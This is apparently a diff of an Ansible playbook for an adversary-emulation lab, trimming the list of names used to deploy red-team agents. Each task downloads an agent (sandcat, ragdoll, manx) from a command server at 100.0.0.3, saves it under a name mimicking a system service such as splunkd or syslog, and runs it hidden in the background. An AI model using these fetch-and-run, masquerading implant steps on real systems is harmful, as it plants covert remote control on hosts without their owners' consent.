@@ -77,7 +77,7 @@
       shell: |
         server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
-        for name in splunkd splunk syslog; do
+        for name in splunkd splunk; do
           curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server/file/download" > "$name"
           chmod +x "$name"
           nohup ./"$name" -server "$server" -group red >/dev/null 2>&1 &
@@ -89,7 +89,7 @@
         server="http://100.0.0.3:8888"
         cd {{ deploy_dir }}
         pip install -q requests beautifulsoup4
-        for name in notlog-html syslog-html; do
+        for name in notlog-html; do
           curl -s -X POST -H "file:ragdoll.py" -H "platform:linux" "$server/file/download" > "$name.py"
           nohup python3 "$name.py" -W "$server/weather" >/dev/null 2>&1 &
         done
@@ -101,7 +101,7 @@
         socket="100.0.0.3:7010"
         contact="tcp"
         cd {{ deploy_dir }}
-        for name in notlog-tcp syslog-tcp splunk-tcp; do
+        for name in syslog-tcp; do
           curl -s -X POST -H "file:manx.go" -H "platform:linux" "$server/file/download" > "$name"
           chmod +x "$name"
           nohup ./"$name" -http "$server" -socket "$socket" -contact "$contact" >/dev/null 2>&1 &
